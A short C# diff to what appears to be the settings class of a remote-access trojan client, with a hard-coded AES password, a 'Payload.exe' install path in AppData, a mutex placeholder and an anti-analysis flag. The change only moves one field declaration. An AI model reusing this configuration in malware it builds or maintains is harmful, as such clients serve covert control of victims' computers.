@@ -12,12 +12,12 @@ namespace Client
         public static readonly string Install = "false";
         public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
         public static readonly string Password = "NYAN CAT";
-        public static readonly Aes256 aes256 = new Aes256(Password);
         public static readonly string MTX = "%MTX%";
 #if DEBUG
         public static readonly string Anti = "false";
 #else
         public static readonly string Anti = "%Anti%";
 #endif
+        public static readonly Aes256 aes256 = new Aes256(Password);
     }
 }
